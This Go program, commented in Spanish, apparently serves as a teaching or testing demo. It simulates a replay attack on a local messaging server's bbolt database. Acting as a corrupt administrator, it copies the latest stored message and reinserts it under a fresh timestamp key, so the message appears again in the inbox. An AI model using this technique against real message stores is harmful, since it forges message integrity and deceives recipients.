package main

import (
	"fmt"
	"log"
	"strings"
	"time"

	"go.etcd.io/bbolt"
)

func main() {
	fmt.Println("===========================================")
	fmt.Println("SIMULADOR DE REPLAY ATTACK")
	fmt.Println("===========================================")

	// 1. Abrir la base de datos simulando ser el Administrador Corrupto
	db, err := bbolt.Open("../../data/server.db", 0600, nil)
	if err != nil {
		log.Fatalf("[!] Error al abrir la base de datos: %v", err)
	}
	defer db.Close()

	// 2. Transacción de lectura y escritura
	err = db.Update(func(tx *bbolt.Tx) error {
		b := tx.Bucket([]byte("messages"))
		if b == nil {
			return fmt.Errorf("No se encontró el bucket 'messages'")
		}

		// Buscar el último mensaje del bucket
		c := b.Cursor()
		lastK, lastV := c.Last()
		if lastK == nil {
			return fmt.Errorf("No hay mensajes en la base de datos para duplicar.")
		}

		originalKey := string(lastK)
		fmt.Printf("[+] Mensaje interceptado (Key original: %s)\n", originalKey)

		// La clave tiene formato: "{destinatario}:{emisor}:{timestamp}"
		// Necesitamos conservar el prefijo "{destinatario}:{emisor}:" y solo cambiar el timestamp
		// para que el servidor siga encontrando el mensaje en la bandeja correcta.
		parts := strings.SplitN(originalKey, ":", 3)
		if len(parts) < 3 {
			return fmt.Errorf("Formato de clave inesperado: %s", originalKey)
		}
		prefix := parts[0] + ":" + parts[1] + ":"

		// Esperamos 1 segundo para que el nuevo timestamp sea diferente
		time.Sleep(1 * time.Second)

		// Nueva clave con mismo destinatario y emisor, pero timestamp nuevo (mensaje "fresco")
		newKey := fmt.Sprintf("%s%d", prefix, time.Now().UnixNano())

		if err := b.Put([]byte(newKey), lastV); err != nil {
			return err
		}

		fmt.Printf("[+] Nueva clave inyectada: %s\n", newKey)
		fmt.Println("[+] ¡Ataque completado! El mensaje ha sido duplicado e inyectado de nuevo en el buzón.")
		fmt.Println()
		return nil
	})

	if err != nil {
		log.Fatalf("Error durante el ataque: %v", err)
	}
}
